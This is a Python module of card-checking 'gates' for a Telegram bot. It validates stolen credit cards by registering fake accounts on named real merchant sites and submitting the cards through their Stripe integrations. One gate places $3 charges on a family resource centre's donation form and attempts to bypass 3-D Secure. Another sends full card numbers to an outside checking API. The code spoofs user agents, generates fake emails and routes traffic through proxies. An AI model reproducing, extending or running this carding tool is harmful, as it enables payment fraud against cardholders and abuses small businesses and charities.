# ============================================================
#  Meduza Gates — Ported from meduza_patched.py for TG bot
#  Gates: sa1 (Stripe Auth CCN), sa2 (Stripe Auth CVV),
#         nvbv (Braintree NonVBV), chg3 (Stripe Charge $3)
# ============================================================

import os
import re
import time
import json
import uuid
import string
import random
import secrets
import hashlib
import socket
import requests
from datetime import datetime
from typing import Optional, Dict, Any

try:
    from faker import Faker
except ImportError:
    Faker = None

try:
    from fake_useragent import UserAgent
except ImportError:
    UserAgent = None


# ============================================================
#  Helpers
# ============================================================
def _gstr(src, a, b):
    try:
        return src.split(a, 1)[1].split(b, 1)[0]
    except Exception:
        return ""


def _rand_email():
    domains = [
        'gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com',
        'proton.me', 'live.com', 'msn.com', 'ymail.com', 'gmx.com',
        'zoho.com', 'fastmail.com', 'pm.me', 'web.de', 'mail.ru',
    ]
    if Faker:
        fake = Faker()
        name = fake.user_name().lower()
    else:
        name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{name}_{secrets.token_hex(4)}@{random.choice(domains)}"


def _rand_password():
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(secrets.choice(chars) for _ in range(12))


def _get_ua():
    if UserAgent:
        try:
            ua = UserAgent(platforms='mobile')
            return ua.random
        except Exception:
            pass
    return random.choice([
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
    ])


def _setup_session(proxy_dict=None):
    ses = requests.Session()
    ses.verify = False
    if proxy_dict:
        ses.proxies.update(proxy_dict)
    return ses


# ============================================================
#  Gate: sa1 — Stripe Auth CCN (ljandrews.net)
# ============================================================
def sa1_check_card(cc_line, proxy_dict=None):
    """Stripe Auth CCN gate. Returns 'Approved | ...' or 'Declined | ...'"""
    start = time.time()
    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Error | Invalid format"
        cc, mm, yy, cvv = parts
        mm = mm.zfill(2)
        yy = yy[-2:].zfill(2)
        cvv = cvv[:4]

        ses = _setup_session(proxy_dict)
        ua = _get_ua()
        email = _rand_email()
        guid, muid, sid, sessionuid = (str(uuid.uuid4()) for _ in range(4))
        today1 = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        headers_base = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'user-agent': ua,
        }

        # 1. Get register nonce
        r = ses.get('https://ljandrews.net/my-account/', headers=headers_base, timeout=20)
        regnonce = _gstr(r.text, 'name="woocommerce-register-nonce" value="', '"')
        if not regnonce:
            return f"Declined | Gateway Error | {time.time()-start:.1f}s"

        # 2. Register
        reg_data = {
            'email': email,
            'wc_order_attribution_source_type': 'organic',
            'wc_order_attribution_referrer': 'https://www.google.com/',
            'wc_order_attribution_utm_source': 'google',
            'wc_order_attribution_utm_medium': 'organic',
            'wc_order_attribution_session_entry': 'https://ljandrews.net/my-account',
            'wc_order_attribution_session_start_time': today1,
            'wc_order_attribution_session_pages': '3',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': ua,
            'woocommerce-register-nonce': regnonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        reg_headers = {**headers_base, 'content-type': 'application/x-www-form-urlencoded',
                       'origin': 'https://ljandrews.net', 'referer': 'https://ljandrews.net/my-account/'}
        ses.post('https://ljandrews.net/my-account/', headers=reg_headers, data=reg_data, timeout=20)

        # 3. Get payment method page
        ses.get('https://ljandrews.net/my-account/payment-methods/', headers=headers_base, timeout=20)
        r = ses.get('https://ljandrews.net/my-account/add-payment-method/', headers=headers_base, timeout=20)
        txt = r.text
        setupNonce = _gstr(txt, '"createSetupIntentNonce":"', '"')
        pklive = _gstr(txt, 'publishableKey":"', '"')

        if not setupNonce or not pklive:
            return f"Declined | Setup Error | {time.time()-start:.1f}s"

        # 4. Create payment method on Stripe
        stripe_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ua,
        }

        pm_data = {
            "billing_details[name]": "",
            "billing_details[email]": email,
            "billing_details[address][country]": "US",
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": yy,
            "card[exp_month]": mm,
            "allow_redisplay": "unspecified",
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/5e596c82e6; stripe-js-v3/5e596c82e6; payment-element; deferred-intent",
            "referrer": "https://ljandrews.net",
            "time_on_page": str(random.randint(20000, 60000)),
            "guid": guid, "muid": muid, "sid": sid,
            "key": pklive,
        }

        # Stripe API calls go direct (no proxy) for reliability
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers,
                          data=pm_data, timeout=25)
        txt = r.text
        idpm = _gstr(txt, 'id": "', '"')
        if not idpm:
            message = _gstr(txt, 'message": "', '"') or "Card rejected"
            return f"Declined | {message} | {time.time()-start:.1f}s"

        # 5. Create setup intent
        ajax_headers = {
            'accept': '*/*',
            'origin': 'https://ljandrews.net',
            'referer': 'https://ljandrews.net/my-account/add-payment-method/',
            'user-agent': ua,
        }
        payload = {
            'action': (None, 'create_setup_intent'),
            'wcpay-payment-method': (None, idpm),
            '_ajax_nonce': (None, setupNonce),
        }
        r = ses.post('https://ljandrews.net/wp-admin/admin-ajax.php', headers=ajax_headers,
                     files=payload, timeout=25)
        res = r.json()
        elapsed = f"{time.time()-start:.1f}s"

        if res.get("success") is True:
            status = res.get("data", {}).get("status", "")
            if status == "succeeded":
                return f"Approved | Auth Success | {elapsed}"
            elif status == "requires_action":
                return f"Declined | 3DS Required | {elapsed}"

        if res.get("success") is False:
            message = _gstr(r.text, '"message":"', '"') or "Declined"
            # Check for live indicators
            if "insufficient" in message.lower():
                return f"Approved | Insufficient Funds (CCN Live) | {elapsed}"
            if "incorrect_cvc" in message.lower() or "security code" in message.lower():
                return f"Approved | CCN Live (CVC Mismatch) | {elapsed}"
            return f"Declined | {message} | {elapsed}"

        return f"Declined | Unknown Response | {elapsed}"

    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError,
            requests.exceptions.Timeout, socket.timeout):
        return f"Declined | Gateway Timeout | {time.time()-start:.1f}s"
    except Exception as e:
        return f"Error | {str(e)[:60]} | {time.time()-start:.1f}s"


def sa1_probe_site():
    try:
        r = requests.get('https://ljandrews.net/my-account/', timeout=15)
        if 'woocommerce' in r.text.lower() or 'register' in r.text.lower():
            return True, "WooCommerce/WCPay active"
        return False, "No WooCommerce markers"
    except Exception as e:
        return False, str(e)[:60]


# ============================================================
#  Gate: sa2 — Stripe Auth CVV (nbconsultantedentaire.ca)
# ============================================================
def sa2_check_card(cc_line, proxy_dict=None):
    """Stripe Auth CVV gate. Returns 'Approved | ...' or 'Declined | ...'"""
    start = time.time()
    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Error | Invalid format"
        cc, mm, yy, cvv = parts
        mm = mm.zfill(2)
        yy = yy[-2:].zfill(2)
        cvv = cvv[:4]

        ses = _setup_session(proxy_dict)
        ua = _get_ua()
        email = _rand_email()
        password = _rand_password()
        guid, muid, sid, sessionuid = (str(uuid.uuid4()) for _ in range(4))
        today1 = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        SITE = 'https://www.nbconsultantedentaire.ca'
        headers_base = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'user-agent': ua,
        }

        # 1. Get register nonce
        r = ses.get(f'{SITE}/en/my-account/', headers=headers_base, timeout=20)
        regN = _gstr(r.text, 'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '"')
        if not regN:
            regN = _gstr(r.text, 'name="woocommerce-register-nonce" value="', '"')
        if not regN:
            return f"Declined | Gateway Error | {time.time()-start:.1f}s"

        # 2. Register
        reg_data = {
            'email': email, 'password': password,
            'wc_order_attribution_source_type': 'organic',
            'wc_order_attribution_referrer': 'https://www.google.com/',
            'wc_order_attribution_utm_source': 'google',
            'wc_order_attribution_utm_medium': 'organic',
            'wc_order_attribution_session_entry': f'{SITE}/en/my-account/',
            'wc_order_attribution_session_start_time': today1,
            'wc_order_attribution_session_pages': '1',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': ua,
            'woocommerce-register-nonce': regN,
            '_wp_http_referer': '/en/my-account/',
            'register': 'Register',
        }
        reg_headers = {**headers_base, 'content-type': 'application/x-www-form-urlencoded',
                       'origin': SITE, 'referer': f'{SITE}/en/my-account/'}
        ses.post(f'{SITE}/en/my-account/', headers=reg_headers, data=reg_data, timeout=20)

        # 3. Navigate payment methods
        ses.get(f'{SITE}/en/mon-compte-2/payment-methods/', headers=headers_base, timeout=20)
        ses.get(f'{SITE}/mon-compte-2/', headers=headers_base, timeout=20)
        ses.get(f'{SITE}/mon-compte-2/moyens-de-paiement/', headers=headers_base, timeout=20)
        r = ses.get(f'{SITE}/mon-compte-2/ajouter-mode-paiement/', headers=headers_base, timeout=20)
        txt = r.text
        setupnonce = _gstr(txt, 'createAndConfirmSetupIntentNonce":"', '"')
        pklive = _gstr(txt, '"key":"', '"')

        if not setupnonce or not pklive:
            return f"Declined | Setup Error | {time.time()-start:.1f}s"

        # 4. Create payment method
        stripe_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ua,
        }

        pm_data = {
            "type": "card",
            "card[number]": cc, "card[cvc]": cvv,
            "card[exp_year]": yy, "card[exp_month]": mm,
            "allow_redisplay": "unspecified",
            "billing_details[address][country]": "CA",
            "pasted_fields": "number,cvc",
            "payment_user_agent": "stripe.js/5e3ab853dc; stripe-js-v3/5e3ab853dc; payment-element; deferred-intent",
            "referrer": SITE,
            "time_on_page": str(random.randint(20000, 50000)),
            "guid": guid, "muid": muid, "sid": sid,
            "_stripe_version": "2024-06-20",
            "key": pklive,
        }

        xr = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers,
                           data=pm_data, timeout=25)
        txt = xr.text
        idpm = _gstr(txt, 'id": "', '"')
        if not idpm:
            message = _gstr(txt, 'message": "', '"') or "Card rejected"
            return f"Declined | {message} | {time.time()-start:.1f}s"

        # 5. Confirm setup intent
        ajax_headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': SITE,
            'referer': f'{SITE}/mon-compte-2/ajouter-mode-paiement/',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': ua,
        }
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': idpm,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': setupnonce,
        }
        r3 = ses.post(f'{SITE}/wp-admin/admin-ajax.php', headers=ajax_headers, data=data, timeout=25)
        res = r3.json()
        elapsed = f"{time.time()-start:.1f}s"

        data_resp = res.get("data") or {}
        status = data_resp.get("status")
        error_msg = data_resp.get("error", {}).get("message") or _gstr(r3.text, 'message":"', '"')

        if status == "succeeded":
            return f"Approved | Auth Success | {elapsed}"
        elif status == "requires_action":
            return f"Declined | 3DS Required | {elapsed}"
        elif error_msg:
            if "insufficient" in error_msg.lower():
                return f"Approved | Insufficient Funds (Live) | {elapsed}"
            if "incorrect_cvc" in error_msg.lower() or "security code" in error_msg.lower():
                return f"Approved | CVV Mismatch (Live) | {elapsed}"
            return f"Declined | {error_msg} | {elapsed}"

        return f"Declined | Unknown Response | {elapsed}"

    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError,
            requests.exceptions.Timeout, socket.timeout):
        return f"Declined | Gateway Timeout | {time.time()-start:.1f}s"
    except Exception as e:
        return f"Error | {str(e)[:60]} | {time.time()-start:.1f}s"


def sa2_probe_site():
    try:
        r = requests.get('https://www.nbconsultantedentaire.ca/en/my-account/', timeout=15)
        if 'woocommerce' in r.text.lower() or 'stripe' in r.text.lower():
            return True, "WooCommerce/Stripe active"
        return False, "No WooCommerce markers"
    except Exception as e:
        return False, str(e)[:60]


# ============================================================
#  Gate: nvbv — Braintree Non-VBV (VoidAPI)
# ============================================================
def nvbv_check_card(cc_line, proxy_dict=None):
    """Braintree Non-VBV check via VoidAPI. Returns 'Approved | ...' or 'Declined | ...'"""
    start = time.time()
    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Error | Invalid format"
        cc, mm, yy, cvv = parts

        ses = _setup_session(proxy_dict)
        ua = _get_ua()

        LIVE_STATUSES = [
            "authenticate_successful", "authenticate_attempt_successful",
            "authentication_successful", "authentication_attempt_successful",
            "three_d_secure_passed", "three_d_secure_authenticated",
            "three_d_secure_attempted", "liability_shifted",
            "liability_shift_possible", "frictionless_flow",
            "challenge_not_required",
        ]

        url = f"https://api.voidapi.xyz/v2/vbv??key=VDX-SHA2X-NZ0RS-O7HAM&card={cc}|{mm}|{yy}|{cvv}"
        r = ses.get(url, headers={'User-Agent': ua}, timeout=30)
        text = r.text.strip()
        elapsed = f"{time.time()-start:.1f}s"

        if "524: A timeout occurred" in text:
            return f"Declined | API Timeout | {elapsed}"

        status = _gstr(text, 'status":"', '"') or "Unknown"

        if status in LIVE_STATUSES:
            return f"Approved | {status} | {elapsed}"

        return f"Declined | {status} | {elapsed}"

    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError,
            requests.exceptions.Timeout, socket.timeout):
        return f"Declined | Gateway Timeout | {time.time()-start:.1f}s"
    except Exception as e:
        return f"Error | {str(e)[:60]} | {time.time()-start:.1f}s"


def nvbv_probe_site():
    try:
        r = requests.get('https://api.voidapi.xyz/', timeout=10)
        if r.status_code < 500:
            return True, "VoidAPI reachable"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:60]


# ============================================================
#  Gate: chg3 — Stripe Charge $3 (quincyfamilyrc.org/bloomerang)
# ============================================================
def chg3_check_card(cc_line, proxy_dict=None):
    """Stripe Charge $3 via Bloomerang donation. Returns 'Approved | ...' or 'Declined | ...'"""
    start = time.time()
    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Error | Invalid format"
        cc, mm, yy, cvv = parts
        mm = mm.zfill(2)
        yy = yy[-2:].zfill(2)
        cvv = cvv[:4]

        ses = _setup_session(proxy_dict)
        ua = _get_ua()

        if Faker:
            fake = Faker("en_US")
            try:
                zipcode = fake.zipcode()
            except Exception:
                zipcode = fake.postcode()
        else:
            zipcode = str(random.randint(10000, 99999))

        APIKEY = "pk_live_iZYXFefCkt380zu63aqUIo7y"

        # 1. Create payment intent via Bloomerang widget
        widget_headers = {
            'accept': '*/*',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://www.quincyfamilyrc.org',
            'referer': 'https://www.quincyfamilyrc.org/',
            'user-agent': ua,
        }
        json_data = {
            'ServedSecurely': True,
            'FormUrl': 'https://www.quincyfamilyrc.org/donate/',
            'Logs': [],
        }
        r = ses.post('https://api.bloomerang.co/v1/Widget/3729409',
                     params={'ApiKey': 'pub_fa6f55a1-d391-11eb-ab84-0253c981a9f9'},
                     headers=widget_headers, json=json_data, timeout=25)
        txt = r.text
        pi_ = _gstr(txt, 'PaymentIntentId":"', '"')
        ClientSecret = _gstr(txt, 'ClientSecret":"', '"')
        StripeAccountId = _gstr(txt, 'StripeAccountId":"', '"')

        if not pi_ or not ClientSecret:
            return f"Declined | Widget Error | {time.time()-start:.1f}s"

        # 2. Confirm payment intent with card
        stripe_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ua,
        }

        confirm_data = {
            "return_url": "https://www.quincyfamilyrc.org/donate/",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_year]": yy,
            "payment_method_data[card][exp_month]": mm,
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[billing_details][address][postal_code]": zipcode,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[pasted_fields]": "number,cvc",
            "payment_method_data[payment_user_agent]": "stripe.js/94528a98b2; stripe-js-v3/94528a98b2; payment-element",
            "payment_method_data[referrer]": "https://www.quincyfamilyrc.org",
            "payment_method_data[time_on_page]": str(random.randint(30000, 120000)),
            "payment_method_data[guid]": str(uuid.uuid4()),
            "payment_method_data[muid]": str(uuid.uuid4()),
            "payment_method_data[sid]": str(uuid.uuid4()),
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": APIKEY,
            "client_secret": ClientSecret,
        }

        r = requests.post(f'https://api.stripe.com/v1/payment_intents/{pi_}/confirm',
                          headers=stripe_headers, data=confirm_data, timeout=30)
        response_text = r.text

        try:
            resp = json.loads(response_text)
        except Exception:
            resp = {}

        err = resp.get("error") or {}
        last = ((err.get("payment_intent") or {}).get("last_payment_error") or {})
        status = _gstr(response_text, '"status": "', '"') or resp.get("status", "")

        decline_code = (last.get("decline_code") or last.get("code")
                        or err.get("decline_code") or err.get("code"))
        message = last.get("message") or err.get("message")
        elapsed = f"{time.time()-start:.1f}s"

        if status == "succeeded":
            return f"Approved | Charged $3 | {elapsed}"

        if status == "requires_action":
            # Attempt 3DS bypass
            three_d_source = resp.get('next_action', {}).get('use_stripe_sdk', {}).get('three_d_secure_2_source')
            if three_d_source and StripeAccountId:
                try:
                    # Fingerprint
                    fp_data = {'threeDSMethodData': 'eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6ImMxMmU5NmRhLWY0OWUtNDc1Yi05NzMyLTZkYWNjOTJkZTdhMCJ9'}
                    requests.post(
                        f'https://hooks.stripe.com/3d_secure_2/fingerprint/{StripeAccountId}/{three_d_source}',
                        headers={'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua},
                        data=fp_data, timeout=15)

                    # Authenticate
                    browser_data = json.dumps({
                        "fingerprintAttempted": True, "challengeWindowSize": None,
                        "threeDSCompInd": "Y", "browserJavaEnabled": False,
                        "browserJavascriptEnabled": True, "browserLanguage": "en-GB",
                        "browserColorDepth": "24", "browserScreenHeight": "1080",
                        "browserScreenWidth": "1920", "browserTZ": "0",
                        "browserUserAgent": ua
                    })
                    from urllib.parse import quote_plus
                    auth_data = (
                        f'source={three_d_source}&browser={quote_plus(browser_data)}&'
                        f'one_click_authn_device_support[hosted]=false&'
                        f'one_click_authn_device_support[same_origin_frame]=false&'
                        f'one_click_authn_device_support[spc_eligible]=false&'
                        f'one_click_authn_device_support[webauthn_eligible]=false&'
                        f'one_click_authn_device_support[publickey_credentials_get_allowed]=true&'
                        f'key={APIKEY}&_stripe_version=2024-06-20'
                    )
                    requests.post('https://api.stripe.com/v1/3ds2/authenticate',
                                  headers=stripe_headers, data=auth_data, timeout=15)

                    # Check final status
                    r2 = requests.get(
                        f'https://api.stripe.com/v1/payment_intents/{pi_}',
                        params={'is_stripe_sdk': 'false', 'client_secret': ClientSecret,
                                'key': APIKEY, '_stripe_version': '2024-06-20'},
                        headers=stripe_headers, timeout=15)

                    resp2 = r2.json() if r2.text else {}
                    err2 = resp2.get("error") or {}
                    pi_data = err2.get("payment_intent") or {}
                    status2 = resp2.get("status") or err2.get("status", "")
                    last2 = pi_data.get("last_payment_error") or {}
                    dc2 = last2.get("decline_code") or last2.get("code") or err2.get("decline_code") or err2.get("code")
                    msg2 = last2.get("message") or err2.get("message") or "Unknown"
                    elapsed = f"{time.time()-start:.1f}s"

                    if status2 == "succeeded":
                        return f"Approved | Charged $3 (3DS Bypass) | {elapsed}"
                    elif dc2:
                        if "insufficient" in (msg2 or "").lower():
                            return f"Approved | Insufficient Funds (Live) | {elapsed}"
                        return f"Declined | {dc2.upper()}: {msg2} | {elapsed}"
                    else:
                        return f"Declined | 3DS Failed | {elapsed}"
                except Exception:
                    return f"Declined | 3DS Challenge Required | {elapsed}"
            return f"Declined | 3DS Required | {elapsed}"

        if decline_code:
            if "insufficient" in (message or "").lower():
                return f"Approved | Insufficient Funds (Live) | {elapsed}"
            return f"Declined | {decline_code.upper()}: {message} | {elapsed}"

        return f"Declined | {message or 'Unknown'} | {elapsed}"

    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError,
            requests.exceptions.Timeout, socket.timeout):
        return f"Declined | Gateway Timeout | {time.time()-start:.1f}s"
    except Exception as e:
        return f"Error | {str(e)[:60]} | {time.time()-start:.1f}s"


def chg3_probe_site():
    try:
        r = requests.get('https://www.quincyfamilyrc.org/donate/', timeout=15)
        if 'bloomerang' in r.text.lower() or 'stripe' in r.text.lower():
            return True, "Bloomerang/Stripe active"
        return False, "No payment markers"
    except Exception as e:
        return False, str(e)[:60]
